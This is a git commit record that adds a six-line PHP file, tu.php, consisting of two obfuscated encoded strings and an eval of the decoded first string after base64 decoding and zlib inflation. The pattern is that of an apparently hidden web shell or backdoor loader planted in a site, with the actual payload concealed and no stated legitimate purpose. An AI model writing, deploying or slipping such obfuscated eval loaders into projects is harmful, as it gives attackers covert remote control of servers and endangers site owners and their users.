e4942e253dc8e576bd7af3c817156b262e66c5c8
mangoleh098 <jatinainggolan119@gmail.com>
2025-07-28 06:58:42 +0700

    Create tu.php

---
+++ tu.php
@@ -0,0 +1,6 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
+$Lix = "=4DksYer+eOKPEcnMq5yy98vjkBNdJsaR0hsh69MGWqyAFS7i3f3zItBCqr6mruuXYobyzyylPvpOyT0XtINF5j31+huZ8T4gu0tUT52uNhAkZx0kowYaFMWnLgmFvLu04wSRCBXLoifwAowVqSDr4TrM4sf2U0YeoPlGLqH+Qs4e7CFVd+g5sub2Y5p4K9yTa2ph9C5XjcjmSy3sGvU20gzdEGMemiWRptEvYoOkmGKdo/wsY39mDGrhDyKMk0gR1ODbk7EMkqSKUiUSJ4iql8fLQnJzGk4c2TAsiLhjhO0rBcZdYvocRz0FPsXN2PcntyyJl0x7e5dd8dgPR2PZxW7v8L+j1qEIhZg18HTQa8nr5g0v4WjSrtvbztYLcAsM+D+vwHHwM4adHVhcin/WHQKBwJe+vcA0Eg/GHQOB4fwB4TA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
